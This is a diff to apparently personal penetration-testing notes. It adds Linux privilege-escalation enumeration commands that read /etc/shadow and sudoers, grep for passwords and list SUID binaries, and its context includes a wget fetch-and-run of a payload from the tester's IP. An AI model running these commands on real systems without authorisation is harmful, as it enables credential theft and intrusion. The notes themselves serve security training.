@@ -130,4 +130,49 @@ wget http://[Your IP Address]/[document.py]
 python document.py
 /usr/bin/python document.py
 ```
+> If we are now a user on the target machine but do not have sufficient privileges, next is privilege escalation.
+<br>
 
+# LINUX PRIVILEGE ESCALATION
+> First of all, get informaton from the machine.
+```
+whoami
+id
+uname -a
+cat /proc/version
+cat /etc/issue
+cat /etc/shadow
+cat /etc/passwd
+cat /etc/sudoers
+cat /etc/crontab
+ps aux
+ifconfig
+locate password
+find / -name password 2>/dev/null
+find . type f -exec grep -i -I "PASSWORD" {} /dev/null \;
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+<br>
+<br>
+
+> Shows the commands of the user before you:
+```
+history
+```
+> Shows what the current user can do:
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+> Shows the commands:
+```
+ls -la /usr/bin
+```
+> Let's see which commands can run without root:
+```
+sudo -l
+find / -type f -perm -04000 -ls 2>/dev/null
+```
+<br>
+<br>
+
+> From here, we are likely to encounter thousands of possibilities. Since each machine has a different vulnerability, we must do our own research after the basic operations.
